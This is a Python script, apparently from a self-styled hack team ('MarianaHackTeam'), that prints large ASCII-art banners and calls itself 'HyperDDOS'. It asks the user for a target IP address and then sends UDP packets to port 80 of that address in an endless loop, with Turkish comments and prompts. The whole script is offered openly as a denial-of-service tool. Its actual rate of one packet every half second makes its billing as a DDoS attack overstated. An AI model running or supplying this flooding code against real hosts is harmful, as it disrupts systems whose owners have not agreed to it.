print("""

                            (
                .            )        )
                         (  (|              .
                     )   )\/ ( ( (
             *  (   ((  /     ))\))  (  )    )
           (     \   )\(          |  ))( )  (|
           >)     ))/   |          )/  \((  ) \
           (     (      .        -.     V )/   )(    (
            \   /     .   \            .       \))   ))
              )(      (  | |   )            .    (  /
             )(    ,'))     \ /          \( `.    )
             (\>  ,'/__      ))            __`.  /
            ( \   | /  ___   ( \/     ___   \ | ( (
             \.)  |/  /   \__      __/   \   \|  ))
            .  \. |>  \      | __ |      /   <|  /
                 )/    \____/ :..: \____/     \ <
          )   \ (|__  .      / ;: \          __| )  (
         ((    )\)  ~--_     --  --      _--~    /  ))
          \    (    |  ||               ||  |   (  /
                \.  |  ||_             _||  |  /
                  > :  |  ~V+-I_I_I-+V~  |  : (.
                 (  \:  T\   _     _   /T  : ./
                  \  :    T^T T-+-T T^T    ;<
                   \..`_       -+-       _'  )
         )            . `--=.._____..=--'. ./         (
        ((     ) (          )             (     ) (   )>
         > \/^/) )) (   ( /(.      ))     ))._/(__))./ (_.
        (  _../ ( \))    )   \ (  / \.  ./ ||  ..__:|  _. \
        |  \__.  ) |   (/  /: :)) |   \/   |(  <.._  )|  ) )
       ))  _./   |  )  ))  __  <  | :(     :))   .//( :  : |
       (: <     ):  --:   ^  \  )(   )\/:   /   /_/ ) :._) :
        \..)   (_..  ..  :    :  : .(   \..:..    ./__.  ./
""")

print("""██╗  ██╗██╗   ██╗██████╗ ███████╗██╗      █████╗ ███╗   ███╗███████╗██████╗ ██████╗  ██████╗ ███████╗
██║  ██║╚██╗ ██╔╝██╔══██╗██╔════╝██║     ██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝
███████║ ╚████╔╝ ██████╔╝█████╗  ██║     ███████║██╔████╔██║█████╗  ██║  ██║██║  ██║██║   ██║███████╗
██╔══██║  ╚██╔╝  ██╔═══╝ ██╔══╝  ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██║  ██║██║  ██║██║   ██║╚════██║
██║  ██║   ██║   ██║     ██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██████╔╝██████╔╝╚██████╔╝███████║
╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
                                                                                                     """)

print("Copyright By Hyperinios MarianaHackTeam AsLeader... ")


import time
import socket
import random

def ddos_attack(target_ip):
    packet = b"Hypering"

    interval = 0.5  # Paket gönderme aralığı (saniye)
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((target_ip, 80))
            s.sendto(packet, (target_ip, 80))
            s.close()
            print("Paket gönderildi: HyperDDOS")
            time.sleep(interval)
        except socket.error:
            print("Bağlantı hatası! Hedef IP'yi kontrol edin.")
            break

# Hedef IP'yi kullanıcıdan alalım
target_ip = input("Hedef IP adresini girin: ")

# DDoS saldırısını başlatalım
ddos_attack(target_ip)